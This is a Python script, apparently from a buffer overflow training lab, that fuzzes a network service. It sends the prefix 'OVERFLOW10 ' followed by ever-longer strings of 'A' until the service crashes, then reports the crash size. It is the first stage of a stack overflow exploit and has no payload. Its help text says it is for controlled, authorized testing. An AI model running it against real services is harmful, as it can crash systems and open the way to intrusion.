#!/usr/bin/env python3

import socket
import argparse
import itertools
import time
import subprocess
import sys
from typing import Optional

def main(ip: str, port: int, increment: Optional[int] = None) -> None:
	# Define prefix and buffer
	prefix = b"OVERFLOW10 "	# CHANGE
	buffer = b"A"
	timeout = 5
	payload = b""
	try:
		# Create socket object
		with socket.socket() as s:
			# Connect to target server
			s.connect((ip, port))

			# Set Timeout
			s.settimeout(timeout)

			# Print server banner
			try:
				response = s.recv(4096)
				print(f"{response.decode()}")
			except:
				pass

			# Send data to the server with increasing buffer sizes
			step = increment or 100
			for size in itertools.count(step, step):
				payload = b"".join(
					[
						prefix,
						buffer * size
					]
				)
				print(f"Fuzzing with {len(payload) - len(prefix)} bytes...")
				s.send(payload)

				response = s.recv(4096)
				# Print the response from the server
				print(f"Response: {response.decode()}")

	except ConnectionError:
		print('Connection Refused')
		sys.exit(0)
	except:
		print("\n","="*25,"CRASH","="*25,"\n")
		overflow_threshold = len(payload) - len(prefix)
		print(f"Application crashed at {overflow_threshold} bytes!")
		sys.exit(0)

if __name__ == "__main__":
	# Parse command line arguments
	parser = argparse.ArgumentParser(
		prog="Crash Fuzzer",
		description="""This is a Python script for fuzz testing a remote server by sending various buffer sizes to the target application. 
	The script takes three arguments: an IP address, a port number, and an optional increment flag. It runs the target program multiple times, each time with a different buffer size, 
	in an attempt to crash the target program. The IP address and port number must be provided when running the script, and the increment flag can be optionally specified to set the 
	step size for the buffer size increases. By default, the increment value is set to 100. The purpose of this script is to test the robustness of the target program by simulating 
	various attack scenarios. It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
		epilog="Have fun experimenting with this tool!"
	)
	parser.add_argument("ip", help="IP address of the target")
	parser.add_argument("port", type=int, help="Port number of the target")
	parser.add_argument("-i", "--increment", type=int, help="Increment value to be used, default is 100")
	args = parser.parse_args()

	# Call main function
	main(args.ip, args.port, args.increment)